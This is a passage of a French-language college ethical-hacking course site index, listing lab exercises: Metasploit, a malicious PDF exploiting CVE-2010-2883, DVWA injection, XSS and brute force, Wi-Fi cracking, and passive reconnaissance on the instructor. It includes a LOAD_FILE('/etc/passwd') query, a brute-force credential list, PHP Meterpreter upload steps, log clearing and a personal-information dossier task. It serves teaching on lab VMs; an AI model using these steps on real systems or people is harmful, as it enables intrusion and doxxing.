</ol>"},{"location":"exercices/Injection_SQL/#exercice-optionnel","title":"Exercice optionnel","text":""},{"location":"exercices/Injection_SQL/#injection-sql-en-moyenne-securite","title":"Injection SQL en moyenne s\u00e9curit\u00e9","text":"<p>Faites les \u00e9tapes d'injection SQL avev DVWA en moyenne s\u00e9curit\u00e9 :   </p> <ol> <li>D\u00e9terminer le type d'assignation des valeurs dans la requ\u00eate  </li> <li>D\u00e9terminer le nombre de colonnes que la requ\u00eate retourne  </li> <li>Trouver les informations sur la base de donn\u00e9es</li> <li>Faire la liste des tables</li> <li>Faire la liste des champs des tables</li> </ol> <p>Indice : BurpSuite!  </p>"},{"location":"exercices/Intro_Metasploit/","title":"Exercices - Intro Metasploit","text":""},{"location":"exercices/Intro_Metasploit/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur Metasploit </p> <p>Pour ces exercices, vous aurez besoin de Kali et Metasploitable.</p>"},{"location":"exercices/Intro_Metasploit/#exercices-obligatoires","title":"Exercices obligatoires","text":"<p>Dans Kali : 1. Ouvrez le terminal. 2. D\u00e9marrez PostGreSQL. 3. Initialisez la BD de Metasploit. 4. D\u00e9marrez la console <code>msfconsole</code>. 3. Cr\u00e9ez un espace de travail nomm\u00e9 cegep. 4. Avec db_nmap, balayez Metasploitable. 5. Avec le auxiliary/scanner/portscan/tcp, balayez Metasploitable.  6. Balayez pour les mots de passe de MySQL.  7. Allez extraire le hashdump. (Suivez les \u00e9tapes de la le\u00e7on)  </p>"},{"location":"exercices/Intro_Metasploit/#exercice-optionnel-avance","title":"Exercice optionnel (avanc\u00e9)","text":"<p>Objectif de l'exercice : Obtenir le fichier /etc/passwd de Matasploit, via MySQL.  </p> <p>Dans la console metasploit, utiliser le module <code>auxiliary/admin/mysql/mysql_sql</code>. </p> <p>Dans les options, utilisez la commande SQL suivante : <code>SELECT LOAD_FILE('/etc/passwd')</code> </p>"},{"location":"exercices/Lois/","title":"Exercice sur les lois","text":""},{"location":"exercices/Lois/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la loi </p>"},{"location":"exercices/Lois/#droit-a-la-deconnexion","title":"Droit \u00e0 la d\u00e9connexion","text":"<p>En \u00e9quipe de 4 \u00e9tudiants, consultez le document de la loi Ontario - Disconnecting from work et r\u00e9pondez aux questions suivantes :  </p> <ul> <li>Qu'est-ce que le droit \u00e0 la d\u00e9connexion ?</li> <li>D'apr\u00e8s vous, quels outils de communications ne devraient pas \u00eatre utilis\u00e9s par un employeur pour communiquer avec un employ\u00e9 en dehors des heures de travail ?  </li> <li>Devrait-il y avoir des exceptions ?  </li> <li>Aimeriez-vous que cette loi s'applique au Qu\u00e9bec ?  </li> </ul>"},{"location":"exercices/PDF_Malicieux/","title":"Exercices - PDF Malicieux","text":""},{"location":"exercices/PDF_Malicieux/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur les antivirus et pdf malicieux </p>"},{"location":"exercices/PDF_Malicieux/#exercice-obligatoire","title":"Exercice obligatoire","text":""},{"location":"exercices/PDF_Malicieux/#installation-dadobe-reader","title":"Installation d'Adobe Reader","text":"<p>Sur votre VM Windows XP, t\u00e9l\u00e9chargez et installez la version 9.3.4 d'Adobe Reader.</p> <p>T\u00e9l\u00e9chargement d'Adobe Reader 9.3.4</p>"},{"location":"exercices/PDF_Malicieux/#creer-votre-pdf-malicieux","title":"Cr\u00e9er votre PDF malicieux","text":"<p>Sur votre machine Kali :</p> <ol> <li>Trouvez le module pour la faille CVE:2010-2883.</li> <li>Chargez le module et renseignez les options.</li> <li>Trouvez le PAYLOAD pour se connecter avec Meterpreter.</li> <li>Assignez le PAYLOAD au module.</li> <li>Configurez le PAYLOAD.</li> <li>Cr\u00e9ez le PDF.</li> <li>Transf\u00e9rez le PDF \u00e0 votre machine Windows XP.</li> </ol>"},{"location":"exercices/PDF_Malicieux/#demarrer-le-serveur-meterpreter-sur-kali","title":"D\u00e9marrer le serveur Meterpreter sur kali","text":"<p>Commencez l'\u00e9coute avec le module appropri\u00e9 de Metasploit. (Voir le\u00e7on 9)</p>"},{"location":"exercices/PDF_Malicieux/#ouvrir-le-pdf","title":"Ouvrir le PDF","text":"<p>Sur votre machine Windows XP, ouvrez le PDF. Ensuite, allez dans votre Kali et attendez le d\u00e9marrage de la session.</p>"},{"location":"exercices/PDF_Malicieux/#migrer-le-processus-meterpreter","title":"Migrer le processus Meterpreter.","text":"<ol> <li>Trouvez un processus sur la machine qui est au nom de l'utilisateur.</li> <li>Migrer le processus.</li> </ol>"},{"location":"exercices/PDF_Malicieux/#essayer-les-commandes-meterpreter","title":"Essayer les commandes Meterpreter","text":"<p>Voici quelques commandes \u00e0 essayer :</p> <ul> <li><code>getsystem</code></li> <li><code>sysinfo</code></li> <li><code>screenshot</code></li> <li><code>idletime</code></li> <li><code>shutdown</code></li> </ul>"},{"location":"exercices/Pare_feu/","title":"Exercices - Pare-feu","text":""},{"location":"exercices/Pare_feu/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur les pare-feux</p>"},{"location":"exercices/Pare_feu/#exercices-obligatoires","title":"Exercices obligatoires","text":""},{"location":"exercices/Pare_feu/#pare-feu-linux","title":"Pare-feu Linux","text":"<p>Les exercices suivants utiliseront les VM de Kali et Metasploitable.</p>"},{"location":"exercices/Pare_feu/#balayage-initial","title":"Balayage initial","text":"<p>Avec Kali, balayez les ports de Metasploitable.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#installer-le-pare-feu-sur-metasploitable","title":"Installer le pare-feu sur Metasploitable","text":"<p>Installez UFW sur Metasploitable et activez-le.</p> <p>Avec Kali, balayez les ports de Metasploitable.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#ouvrir-des-ports","title":"Ouvrir des ports","text":"<p>Permettez l'ouverture des ports SSH, Telnet et HTTP sur Metasploitable.</p> <p>Avec Kali, balayez les ports de Metasploitable.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#utilisation-de-openvas","title":"Utilisation de OpenVAS","text":"<p>Ex\u00e9cutez un balayage avec OpenVAS pour Metasploitable.</p> <p>Une fois le balayage termin\u00e9, que remarquez-vous?</p>"},{"location":"exercices/Pare_feu/#effacer-une-regle","title":"Effacer une r\u00e8gle","text":"<p>Effacez la r\u00e8gle pour le port Telnet.</p> <p>Avec Kali, balayez les ports de Metasploitable.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#desactiver-le-pare-feu","title":"D\u00e9sactiver le pare-feu","text":"<p>D\u00e9sactivez le pare-feu sur Metasploitable.</p> <p>Avec Kali, balayez les ports de Metasploitable.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#exercices-optionnels","title":"Exercices optionnels","text":""},{"location":"exercices/Pare_feu/#pare-feu-windows","title":"Pare-feu Windows","text":"<p>Les exercices suivants utiliseront les VM de Kali et Windows XP.</p>"},{"location":"exercices/Pare_feu/#balayage-initial_1","title":"Balayage initial","text":"<p>Avec Kali, balayez les ports de Windows XP.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#activer-le-pare-feu-sur-windows-xp","title":"Activer le pare-feu sur Windows XP","text":"<p>Activez le pare-feu sur Windows XP.</p> <p>Avec Kali, balayez les ports de Windows XP.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#permettre-le-partage-de-fichiers-sur-windows-xp","title":"Permettre le partage de fichiers sur Windows XP","text":"<p>Dans la configuration de Windows XP, permettez le partage de fichiers.</p> <p>Avec Kali, balayez les ports de Windows XP.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Pare_feu/#desactiver-le-pare-feu_1","title":"D\u00e9sactiver le pare-feu","text":"<p>D\u00e9sactivez le pare-feu sur Windows XP.</p> <p>Avec Kali, balayez les ports de Windows XP.</p> <p>Notez les ports ouverts.</p>"},{"location":"exercices/Penetration_reseau_sans_fils/","title":"Exercices - P\u00e9n\u00e9tration de r\u00e9seaux sans-fils","text":""},{"location":"exercices/Penetration_reseau_sans_fils/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la p\u00e9n\u00e9tration de r\u00e9seau sans-fils </p>"},{"location":"exercices/Penetration_reseau_sans_fils/#exercices-obligatoires","title":"Exercices obligatoires","text":"<ol> <li>Trouver le mot de passe du r\u00e9seau sans-fil du professeur.</li> </ol> <p>Le SSID du r\u00e9seau est : <code>dundermifflin</code></p> <p>Outils \u00e0 utiliser :</p> <ol> <li>Airmon-ng</li> <li>Airodump-ng</li> <li>Aireplay-ng</li> <li>Aircrack-ng</li> </ol> <p>Pour t\u00e9l\u00e9charger le fichier de mot de passe \u00e0 utiliser, faire la commande suivante dans Kali : <code>wget https://piratage.profinfo.ca/mot_de_passe.txt</code> </p>"},{"location":"exercices/Programmer_application_securisee/","title":"Exercices - S\u00e9curiser une application Web - Premi\u00e8re partie","text":""},{"location":"exercices/Programmer_application_securisee/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la programmation s\u00e9curis\u00e9e </p>"},{"location":"exercices/Programmer_application_securisee/#exercice-obligatoire","title":"Exercice obligatoire","text":""},{"location":"exercices/Programmer_application_securisee/#code-source","title":"Code source","text":"<p>Le code source de l'application MonMur se trouve dans la VM MonMur.</p>"},{"location":"exercices/Programmer_application_securisee/#vm-contenant-lapplication-web","title":"VM contenant l'application Web","text":"<p>L'application MonMur se trouve sur la VM MonMur.</p> <p>Durant cet exercice, vous aurez \u00e0 s\u00e9curiser l'application contre les vuln\u00e9rabilit\u00e9s suivantes :  </p> <ul> <li>Cas limites lors de l'envoi de commentaires  </li> <li>XSS  </li> <li>Injection PHP via le t\u00e9l\u00e9versement de fichiers  </li> </ul> <p>L'application se trouve dans <code>/var/www</code>.</p>"},{"location":"exercices/Proteger_injection_SQL/","title":"Exercices - Prot\u00e9ger injection SQL","text":""},{"location":"exercices/Proteger_injection_SQL/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la protection d'injection SQL </p>"},{"location":"exercices/Proteger_injection_SQL/#exercice-obligatoire","title":"Exercice obligatoire","text":""},{"location":"exercices/Proteger_injection_SQL/#code-source","title":"Code source","text":"<p>Le code source de l'application MonMur se trouve dans la VM MonMur.</p>"},{"location":"exercices/Proteger_injection_SQL/#vm-contenant-lapplication-web","title":"VM contenant l'application Web","text":"<p>L'application MonMur se trouve sur la VM MonMur.</p> <p>Durant cet exercice, vous aurez \u00e0 s\u00e9curiser l'application contre les vuln\u00e9rabilit\u00e9s suivantes :  </p> <ul> <li>Injection SQL</li> <li>Mauvaise utilisation de la base de donn\u00e9es</li> </ul> <p>Avant de modifier l'application, testez-l\u00e0 pour les failles d'injection SQL. Utilisez SQLMap pour vous aider.  </p> <p>Modifier l'application \u00e0 tous les endroits o\u00f9 la base de donn\u00e9es est utilis\u00e9e.</p> <p>L'application se trouve dans <code>/var/www</code>.</p>"},{"location":"exercices/Reconnaissance_active/","title":"Exercices - Reconnaissance active","text":""},{"location":"exercices/Reconnaissance_active/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la reconnaissance active </p>"},{"location":"exercices/Reconnaissance_active/#exercices-obligatoires","title":"Exercices obligatoires","text":""},{"location":"exercices/Reconnaissance_active/#decouverte-avec-nmap","title":"D\u00e9couverte avec nmap","text":"<p>Activez les vms : Kali, Windows XP et Metasploitable</p> <ol> <li>Dans Kali, utilisez nmap pour faire la d\u00e9couverte du sous-r\u00e9seau (style :192.168.40.0/24) Combien d'actifs trouvez-vous?</li> <li>Utilisez nmap sur chaque actif trouv\u00e9 pour d\u00e9terminer les ports ouverts.</li> <li>Utilisez nmap sur chaque actif pour d\u00e9terminer le syst\u00e8me d'exploitation.</li> </ol>"},{"location":"exercices/Reconnaissance_active/#balayage-de-serveur-web","title":"Balayage de serveur Web","text":"<p>Avec Nikto, balayez votre VM Metasploitable.</p>"},{"location":"exercices/Reconnaissance_active/#exercices-optionnels","title":"Exercices optionnels","text":""},{"location":"exercices/Reconnaissance_active/#installation-dopenvas-a-faire-a-la-maison","title":"Installation d'OpenVAS (\u00e0 faire \u00e0 la maison)","text":"<p>Voir la proc\u00e9dure d'installation. </p>"},{"location":"exercices/Reconnaissance_active/#balayage-de-vulnerabilites-a-faire-a-la-maison","title":"Balayage de vuln\u00e9rabilit\u00e9s (\u00e0 faire \u00e0 la maison)","text":"<p>Avec OpenVAS, balayez les vm suivantes : Windows XP, Metasploitable.</p> <p>Parcourez les vuln\u00e9rabilit\u00e9s entre 8 et 10 de s\u00e9v\u00e9rit\u00e9.</p>"},{"location":"exercices/Reconnaissance_active/#references","title":"R\u00e9f\u00e9rences","text":"<p>OpenVAS on Kali GNU/Linux Part 1: How to install OpenVAS </p>"},{"location":"exercices/Securiser_Apache/","title":"Exercices - S\u00e9curiser un serveur Web Apache","text":""},{"location":"exercices/Securiser_Apache/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la s\u00e9curisation d'Apache </p>"},{"location":"exercices/Securiser_Apache/#exercices-obligatoires","title":"Exercices obligatoires","text":"<ol> <li>Cacher la version d'Apache  </li> <li>Cacher la version de PHP  </li> <li>D\u00e9sactiver le parcours de la liste des fichiers  </li> <li>Prot\u00e9ger les configurations contre le surclassement </li> </ol>"},{"location":"exercices/Securiser_Apache/#exercice-optionnel","title":"Exercice optionnel","text":"<ol> <li>Limiter les m\u00e9thodes de requ\u00eates HTTP \u00e0 GET et POST. </li> </ol>"},{"location":"exercices/Tests_penetration/","title":"Exercices - Tests de p\u00e9n\u00e9tration","text":""},{"location":"exercices/Tests_penetration/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur les tests de p\u00e9n\u00e9tration </p>"},{"location":"exercices/Tests_penetration/#exercices-obligatoires","title":"Exercices obligatoires","text":""},{"location":"exercices/Tests_penetration/#windows-xp","title":"Windows XP","text":"<p>Avec Kali et Windows XP :</p> <p>Essayez ce que le professeur a d\u00e9montr\u00e9 en classe. Avec Metasploit :  </p> <ol> <li>Cr\u00e9ez un espace de travail  </li> <li>Balayez la VM Windows XP  </li> <li>Lancez l'exploit ms08_067_netapi</li> </ol> <p>Essayez l'utilisation de Meterpreter :  </p> <ol> <li>Cr\u00e9ez un fichier sur Kali et t\u00e9l\u00e9versez-le sur Windows</li> <li>Videz l'historique des \u00e9v\u00e9nements</li> <li>Naviguer \u00e0 travers les r\u00e9pertoires</li> <li>Cherchez un fichier nomm\u00e9 hosts</li> <li>Affichez le contenu de hosts</li> <li>Prenez un screenshot de l'\u00e9cran de Windows</li> <li>Ouvrez un shell</li> </ol>"},{"location":"exercices/Tests_penetration/#exercices-optionels","title":"Exercices optionels","text":""},{"location":"exercices/Tests_penetration/#metasploitable","title":"Metasploitable","text":"<p>La section de Metasploitable requiert un peu de recherche. Voyez ceci comme un d\u00e9fi :</p> <p>D\u00e9fi 1 - Se connecter par Remote Shell (protocole RSH - Port 515)</p> <p>Indices : module kali rsh-client, commande rlogin</p> <p>D\u00e9fi 2 - distccd - port 3632</p> <p>Indices : module metasploit</p> <p>D\u00e9fi 3 - Tomcat, port 8180</p> <p>Indices : module metasploit (scanner)</p> <p>Ultime D\u00e9fi (avanc\u00e9) - utiliser nfs pour se donner acc\u00e8s \u00e0 ssh</p> <p>Indices : nsf-common, showmount, mount, ssh-keygen</p>"},{"location":"exercices/Vulnerabilites_Web/","title":"Exercices - Vuln\u00e9rabilit\u00e9s Web","text":""},{"location":"exercices/Vulnerabilites_Web/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":""},{"location":"exercices/Vulnerabilites_Web/#introduction","title":"Introduction","text":"<p>Les exercices d'aujourd'hui utilisent une application Web nomm\u00e9e Damn Vulnerable Web Application ou DVWA, que vous trouverez sur la VM Metasploitable. C'est une application avec des vuln\u00e9rabilit\u00e9s pour tester votre habilet\u00e9 \u00e0 les exploiter.  </p>"},{"location":"exercices/Vulnerabilites_Web/#exercices-obligatoires","title":"Exercices obligatoires","text":""},{"location":"exercices/Vulnerabilites_Web/#execution-de-commandes","title":"Ex\u00e9cution de commandes","text":"<p>Dans DVWA, aller dans la section Command Execution. Utiliser DVWA en basse s\u00e9curit\u00e9 </p> <p>Faites les actions suivantes :  </p> <ol> <li>Voir le contenu du r\u00e9pertoire courant</li> <li>Voir le contenu du r\u00e9pertoire /etc</li> <li>Voir la version de linux  </li> <li>Cr\u00e9er une nouvelle page Web qui affiche votre nom et afficher-la dans Firefox</li> </ol>"},{"location":"exercices/Vulnerabilites_Web/#attaque-avec-une-force-brute","title":"Attaque avec une force brute","text":"<p>Avec BurpSuite, essayer de cracker le mot de passe de la page Brute Force de DVWA.</p> <p>Utiliser cette liste d'utilisateurs : <pre><code>admin  \nadministrator  \ngordonb  \nsmithy  \nlucp  \nlucieng  \n</code></pre></p> <p>Utiliser cette liste de mots de passe :</p> <pre><code>charley  \nabc123  \npassword   \nqwerty  \n123456  \nletmein  \n</code></pre> <p>Quelles combinaisons avez-vous trouv\u00e9?</p>"},{"location":"exercices/Vulnerabilites_Web/#cross-site-scripting","title":"Cross Site Scripting","text":"<ol> <li>Aller sur la page de XSS (stored) dans DVWA.  </li> <li>\u00c9crire le payload dans le message pour afficher une alerte qui affiche votre nom.  </li> <li>Recharger la page, qu'arrive-t'il?</li> </ol>"},{"location":"exercices/Vulnerabilites_Web/#upload","title":"Upload","text":"<ol> <li>Cr\u00e9er un fichier avec un payload \u00e0 l'aide de MSFVenom, pour avoir un shell meterpreter en php  </li> <li>T\u00e9l\u00e9verser votre payload</li> <li>Ex\u00e9cuter le payload</li> <li>Connectez-vous avec Metasploit</li> </ol>"},{"location":"exercices/Vulnerabilites_Web/#exercices-optionnels","title":"Exercices optionnels","text":""},{"location":"exercices/Vulnerabilites_Web/#execution-de-commandes_1","title":"Ex\u00e9cution de commandes","text":"<p>Dans DVWA, aller dans la section Command Execution. Utiliser DVWA en moyenne s\u00e9curit\u00e9 </p> <p>Faites les actions suivantes :  </p> <ol> <li>Analyser le code source et essayez de contrevenir aux nouvelles protections</li> <li>Voir le contenu du r\u00e9pertoire courant</li> <li>Voir le contenu du r\u00e9pertoire /etc</li> <li>Voir la version de linux  </li> <li>Cr\u00e9er une nouvelle page Web qui affiche votre nom et afficher-la dans Firefox</li> </ol>"},{"location":"exercices/Vulnerabilites_Web/#cross-site-scripting_1","title":"Cross Site Scripting","text":"<ol> <li>Aller sur la page de XSS (stored) dans DVWA.  Utiliser DVWA en moyenne s\u00e9curit\u00e9 </li> <li>Analyser le code source et essayez de contrevenir aux nouvelles protections</li> <li>\u00c9crire le payload dans le message pour afficher une alerte qui affiche votre nom.  </li> <li>Recharger la page, qu'arrive-t'il?</li> </ol>"},{"location":"exercices/classification_actifs/","title":"Exercices - Classification d'actifs","text":""},{"location":"exercices/classification_actifs/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur l'inventaire d'actifs </p>"},{"location":"exercices/classification_actifs/#exercice-obligatoire","title":"Exercice obligatoire","text":""},{"location":"exercices/classification_actifs/#mise-en-situation","title":"Mise en situation","text":"<p>Pour l'information sur l'entreprise, veuillez vous r\u00e9f\u00e9rer au dossier de s\u00e9curit\u00e9.</p> <p>Le propri\u00e9taire veut responsabiliser son \u00e9quipe en dressant la liste des actifs de l'entreprise et en assignant ceux-ci aux bons propri\u00e9taires. Votre travail consiste \u00e0 faire une fiche par actif, assigner le bon propri\u00e9taire, le classifier et justifier vos choix.</p> <p>Chaque actif doit avoir une fiche sous cette forme :</p> \u00c9l\u00e9ment Valeur Nom de l'actif Description de l'actif Propri\u00e9taire de l'actif Classification de l'actif Justification de la classification"},{"location":"exercices/classification_actifs/#modele-a-utiliser","title":"Mod\u00e8le \u00e0 utiliser","text":"<p>Voici le mod\u00e8le \u00e0 utiliser pour l'exercice.</p>"},{"location":"exercices/dossier_securite/","title":"Dossier de s\u00e9curit\u00e9","text":""},{"location":"exercices/dossier_securite/#mise-en-situation","title":"Mise en situation","text":""},{"location":"exercices/dossier_securite/#description-de-lentreprise","title":"Description de l'entreprise","text":"<p>La compagnie Kerzo vous donne le contrat de mettre en place une strat\u00e9gie de sauvegarde.</p> <p>La compagnie a une usine de 50 employ\u00e9s.</p>"},{"location":"exercices/dossier_securite/#employes-de-lentreprise","title":"Employ\u00e9s de l'entreprise","text":"Nom de l'employ\u00e9 Poste Superviseur Karine B\u00e9liveau pr\u00e9sidente Sandra Houle vice-pr\u00e9sidente Karine B\u00e9liveau Eric Perreault directeur TI Sandra Houle Serge Gagnon directeur RH Sandra Houle Pierre Michaud directeur d'usine Karine B\u00e9liveau Mireille Boucher directrice des communications Sandra Houle"},{"location":"exercices/dossier_securite/#actifs-de-lentreprise","title":"Actifs de l'entreprise","text":""},{"location":"exercices/dossier_securite/#serveurs","title":"Serveurs","text":"Serveur Fonction Poids (augmentation) PGI Contient le logiciel de gestion de la compagnie 20 gb (+1 gb par mois) FIC Contient les fichiers de la compagnie (Word, Excel, etc.) 40 gb (+3 gb par mois) PAYE Contient le logiciel de paie 10 gb (+500 mb par mois) AD Contient le contr\u00f4leur de domaine, services DNS et DHCP 15 gb (stable) WEB Contient le site Web de l'entreprise 20 gb (stable)"},{"location":"exercices/dossier_securite/#postes-de-travail-outils","title":"Postes de travail outils","text":"Poste de travail Fonction Syst\u00e8me d'exploitation CNC1 Robot manufacturier Windows XP PILEUR Machine pour piler les mat\u00e9riaux Windows 98 SOUDEUSE Contr\u00f4leur du processus de soudage Windows 7"},{"location":"exercices/dossier_securite/#diagramme-reseau","title":"Diagramme r\u00e9seau","text":""},{"location":"exercices/dossier_securite/#informations-diverses","title":"Informations diverses","text":"<p>Les heures d'op\u00e9ration sont du lundi au vendredi, de 8h \u00e0 12h et de 13h \u00e0 17h.</p> <p>Le responsable de la paie entre ses donn\u00e9es le lundi et g\u00e9n\u00e8re la paie avant mardi midi.</p> <p>L'ensemble des op\u00e9rations dans l'usine est contr\u00f4l\u00e9e par le PGI. Perdre plus d'une demie-journ\u00e9e de donn\u00e9es serait catastrophique. Cependant, les plans de contingence font que la production peut fonctionner 8 heures sans le syst\u00e8me informatique.</p>"},{"location":"exercices/reconnaissance_passive/","title":"Reconnaissance passive","text":""},{"location":"exercices/reconnaissance_passive/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la reconnaissance passive </p>"},{"location":"exercices/reconnaissance_passive/#exercice-obligatoire","title":"Exercice obligatoire","text":"<p>Vous voulez en savoir plus sur votre professeur. Vous connaissez les informations suivantes :  </p> <ul> <li>Son nom est \u00c9tienne Rivard  </li> <li>Son courriel personnel est etienne@kerzo.ca  </li> </ul> <p>Trouvez les informations suivantes :  </p> <ul> <li>Noms des membres de sa famille  </li> <li>Adresse civique en 2015  </li> <li>Adresse civique en 2020  </li> <li>Page de la maison mod\u00e8le correspondant \u00e0 l'adresse civique en 2020</li> <li>Num\u00e9ro de t\u00e9l\u00e9phone</li> <li>Ann\u00e9e de construction de sa maison actuelle (la m\u00eame qu'en 2020)  </li> <li>Plus r\u00e9cent dipl\u00f4me obtenu</li> <li>Endroit o\u00f9 travaille son \u00e9pouse</li> <li>Endroit o\u00f9 travaille son fils</li> <li>Dipl\u00f4me le plus r\u00e9cent de sa fille</li> <li>Publication scientifique  </li> <li>Endroit o\u00f9 il s'est mari\u00e9  </li> <li>Combien d'ann\u00e9es il a travaill\u00e9 au C\u00e9gep de Victoriaville</li> <li>Qui a gagn\u00e9 la bourse ATE en 2024 et est pris en photo avec lui</li> <li>Code utilisateur sur GitHub</li> <li>Site de \"bookmarks\" personnel</li> <li>Instagram du chat de la famille</li> <li>Dernier jeu jou\u00e9 sur son iPhone  </li> <li>Nom du livre \u00e9crit par sa soeur  </li> </ul> <p>Inscrivez vos r\u00e9ponses dans ce formulaire </p>"},{"location":"exercices/reconnaissance_passive/#exercices-supplementaires","title":"Exercices suppl\u00e9mentaires","text":"<p>Vous \u00eates dans une \u00e9quipe de piratage \u00e9thique. Votre r\u00f4le est de faire la reconnaissance passive pour votre client. Le client est le C\u00e9gep de Victoriaville.</p>"},{"location":"exercices/reconnaissance_passive/#1-mode-manuel","title":"1 - Mode manuel","text":"<p>Commencer avec les outils manuels. Faire la recherche des sous-domaines avec NMMapper's Subdomain Finder.</p> <p>Voir si vous pouvez trouver d'autres sous-domaines avec le rapport de Google (Google Certificate Transparency Report).</p>"},{"location":"exercices/reconnaissance_passive/#2-mode-automatique","title":"2 - Mode automatique","text":"<p>Dans Kali, utiliser l'outil <code>recon-ng</code>.</p> <p>\u00c9tapes :  </p> <ol> <li>Cr\u00e9er un espace de travail  </li> <li>Ajouter le domaine principal \u00e0 la base de donn\u00e9es  </li> <li>Installer et utiliser les diff\u00e9rents modules pour la reconnaissance (certificate_transparency, whois_pocs, brute_hosts, recon/hosts-hosts/resolve)  </li> <li>G\u00e9n\u00e9rer un rapport en html  </li> </ol> <p>R\u00e9f\u00e9rence : Cours 2 - Reconnaissance passive</p>"},{"location":"exercices/strategie_sauvegarde/","title":"Dossier de s\u00e9curit\u00e9 - R\u00e9diger une strat\u00e9gie de sauvegarde","text":""},{"location":"exercices/strategie_sauvegarde/#mise-en-situation","title":"Mise en situation","text":"<p>Pour l'information sur l'entreprise, veuillez vous r\u00e9f\u00e9rer au dossier de s\u00e9curit\u00e9.</p> <p>Le propri\u00e9taire vous informe qu'il ne veut pas d\u00e9penser plus de 30 000$ pour implanter la sauvegarde de ses syst\u00e8mes. Il vous informe aussi qu'il y a des risques de feu \u00e0 l'usine, qu'il veut une solution de sauvegarde qui serait ad\u00e9quate en cas de feu.</p>"},{"location":"exercices/strategie_sauvegarde/#description-du-travail","title":"Description du travail","text":"<p>Vous devez produire un dossier qui propose votre solution de sauvegarde.</p> <p>Le dossier doit comprendre les \u00e9l\u00e9ments suivants :</p> <ul> <li>Un calendrier de sauvegarde (7 jours)</li> <li>Un budget d'achat de mat\u00e9riel et de logiciel</li> </ul>"},{"location":"exercices/strategie_sauvegarde/#calendrier","title":"Calendrier","text":"<p>Le calendrier doit sp\u00e9cifier quel type de sauvegarde (complet, incr\u00e9mental, diff\u00e9rentiel) doit \u00eatre fait \u00e0 chaque jour, pour chaque serveur.</p> <p>\u00c0 la suite du calendrier, vous devez \u00e9crire un court texte qui justifie vos choix.</p>"},{"location":"exercices/strategie_sauvegarde/#budget-dachat","title":"Budget d'achat","text":"<p>Le budget doit d\u00e9crire tous les \u00e9quipements qui doivent \u00eatre achet\u00e9s, avec leurs prix. Incluez le prix des logiciels et des syst\u00e8mes d'exploitation.</p> <p>Justifiez chaque achat. Le but est de convaincre la compagnie d'investir dans sa s\u00e9curit\u00e9.</p>"},{"location":"labo/Installation_DunderMifflin/","title":"Installation de DunderMifflin dans VirtualBox ou UTM","text":"<p>T\u00e9l\u00e9charger le OVA de Dunder Mifflin via la page de t\u00e9l\u00e9chargement :</p> <p>Page de t\u00e9l\u00e9chargement</p> <p>Configurations de VirtualBox :</p> <p>Dans VirtualBox, aller dans le menu File -&gt; Import Appliance...</p> <p>S\u00e9lectionner le fichier dundermifflin.ova et cliquer sur continuer.</p> <p>Cliquer sur importer.</p> <p>D\u00e9marrer la VM. Dundermifflin est install\u00e9 et fonctionnel.</p>"},{"location":"labo/Installation_Gogo_VirtualBox/","title":"Installation de Gogo dans VirtualBox","text":"<p>T\u00e9l\u00e9charger GOGO - Sharepoint du C\u00e9gep</p> <p>Configurations de VirtualBox :</p> <p>Dans VirtualBox, aller dans le menu File -&gt; Import Appliance...</p> <p>S\u00e9lectionner le fichier gogo.ova et cliquer sur continuer.</p> <p>Cliquer sur importer.</p> <p>D\u00e9marrer la VM. Gogo est install\u00e9 et fonctionnel.</p>"},{"location":"labo/Installation_Kali_VirtualBox/","title":"Installation de Kali Linux dans VirtualBox","text":""},{"location":"labo/Installation_Kali_VirtualBox/#installation-de-virtualbox","title":"Installation de VirtualBox","text":"<p>T\u00e9l\u00e9charger VirtualBox : VirtualBox downloads</p> <p>T\u00e9l\u00e9charger les extensions de VirtualBox (m\u00eame lien)</p>"},{"location":"labo/Installation_Kali_VirtualBox/#creer-le-reseau-interne-de-notre-laboratoire","title":"Cr\u00e9er le r\u00e9seau interne de notre laboratoire","text":"<p>Notre laboratoire virtuel doit permettre \u00e0 toutes les machines virtuelles de communiquer entre elles. Ce sera fait avec un r\u00e9seau NAT (nat network).</p> <p>Dans une fen\u00eatre de commande :</p> <p>Allez dans le r\u00e9pertoire de VirtualBox :</p> <p><code>cd \\Program Files\\Oracle\\VirtualBox</code></p> <p>Ex\u00e9cutez la commande :  </p> <p><code>VBoxManage natnetwork add --netname cegep --network \"192.168.40.0/24\" --enable --dhcp on</code></p>"},{"location":"labo/Installation_Kali_VirtualBox/#installation-de-kali-linux","title":"Installation de Kali Linux","text":"<p>Aller \u00e0 la page de t\u00e9l\u00e9chargement de Kali :</p> <p>Kali Linux Downloads</p> <p>S\u00e9lectionner la version Virtual Machine pour VirtualBox 64bits.</p>"},{"location":"labo/Installation_Kali_VirtualBox/#actions-post-installation","title":"Actions Post-Installation","text":"<p>Mettre \u00e0 jour apt :  </p> <p><code>sudo apt update</code> </p> <p>Installer les outils VM :  </p> <p><code>sudo apt-get install open-vm-tools</code> </p> <p>Activer PostgreSQL au d\u00e9marrage :</p> <p><code>sudo systemctl enable 